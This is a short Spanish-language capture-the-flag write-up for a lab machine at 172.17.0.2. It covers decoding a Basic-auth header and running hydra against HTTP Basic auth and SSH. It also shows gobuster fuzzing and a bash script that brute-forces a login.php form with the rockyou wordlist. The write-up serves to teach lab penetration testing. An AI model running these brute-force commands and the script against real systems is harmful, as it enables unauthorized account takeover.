## Reconocimiento:

Puerto 22 : SSH

Puerto 80 : HTTP

En la web hay un panel de autenticación con Javascript. Antes intercepto la petición para saber como la encripta:

```bash
echo 'YWRtaW46YWRtaW4=' | base64 -d
# Info:
admin:admin
```

Como es en base64 es fácil, ya que no contiene sanitización valida y la web no tiene HTTPS.

```bash
hydra -C ftp-betterdefaultpasslist.txt 172.17.0.2 http-get / -t 64 -I -e nsr
```

User : httpadmin

Pass : fhttpadmin

Ahora toca hacer fuzzing a la web, pero agregando la parte de “Authorization” de la petición:

```bash
gobuster dir -u http://172.17.0.2/ -w <WORDLIST> -x php,txt,html -H "Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=" -s 200 --status-codes-blacklist "" -k -r -t 50
```

Hay un recurso llamado “login.php” con un panel de login anti youtubers de ciberseguridad.

Decido automatizar el ataque con un script:

```bash
#!/bin/bash

URL="http://<IP>/login.php"
USER="admin"
WORDLIST="/usr/share/wordlists/rockyou.txt"
AUTH_HEADER="Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4="
FAIL_STRING="Credenciales incorrectas."

while read -r PASS; do
    echo "[*] Probando contraseña: $PASS"
    RESPONSE=$(curl -s -X POST "$URL" \
      -H "$AUTH_HEADER" \
      -d "username=$USER&password=$PASS")

    if [[ "$RESPONSE" != *"$FAIL_STRING"* ]]; then
        echo "[+] ¡Contraseña encontrada!: $PASS"
        exit 0
    fi
done < "$WORDLIST"

echo "[-] No se encontró la contraseña correcta en el wordlist."
exit 1
```

Y lo ejecuto:

```bash
chmod +x forcePass.sh
bash forcePass.sh
```

Pass : chocolate

Dentro nos revela el usuario balutin y le aplicamos un Hydra:

```bash
hydra -l balutin -P <WORDLIST> ssh://172.17.0.2 -t 64 -I
```

Pass : estrella

## Escalada

```bash
su root
# rockyou
```

Listo.
